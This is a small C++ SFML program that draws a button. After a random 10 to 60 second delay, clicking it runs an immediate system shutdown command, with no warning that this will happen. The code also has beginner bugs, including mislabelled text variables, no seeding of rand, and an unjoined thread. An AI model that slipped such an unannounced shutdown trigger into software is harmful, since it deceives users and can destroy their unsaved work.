#include <SFML/Graphics.hpp>
#include <SFML/Window/Mouse.hpp>
#include <ctime>
#include <thread>

#ifdef _WIN32
#define SHUTDOWN_COMMAND "shutdown /s /t 0"
#else
#define SHUTDOWN_COMMAND "shutdown -h now"
#endif

sf::Vector2i mouseCoord;
std::thread shutdownThread;

int main() {
    sf::RenderWindow window(sf::VideoMode({ 400,400 }), "Button");
    sf::Font font("arial.ttf");


    sf::RectangleShape button(sf::Vector2f(200, 50));
    button.setFillColor(sf::Color::Blue);
    button.setPosition(sf::Vector2f(100, 100));

    sf::Text buttonText(font);
    buttonText.setPosition(sf::Vector2f(100, 100));
    buttonText.setString("BUTTON");
    buttonText.setCharacterSize(24);

    sf::Text buttonText_1(font);
    buttonText.setPosition(sf::Vector2f(100, 100));
    buttonText.setString("BOOM");
    buttonText.setCharacterSize(24);

    bool mousepressed = false;
    bool show = false;

    while (window.isOpen()) {
        while (const std::optional event = window.pollEvent()) {
            
            if (event->is<sf::Event::Closed>())
                window.close();

            if (!mousepressed && sf::Mouse::isButtonPressed(sf::Mouse::Button::Left)) {
                mouseCoord = sf::Mouse::getPosition(window);

                if (mouseCoord.x > 100 && mouseCoord.x < 300 && mouseCoord.y > 100 && mouseCoord.y < 150) {
                    mousepressed = true;
                    buttonText.setString("WAIT");

                    int delay = 10 + rand() % 51;
                    shutdownThread = std::thread([delay]() {
                        std::this_thread::sleep_for(std::chrono::seconds(delay));
                        std::system(SHUTDOWN_COMMAND);
                        });
                    
                }
            }
        }

        window.draw(button);
        window.draw(buttonText);
        window.display();
    }
}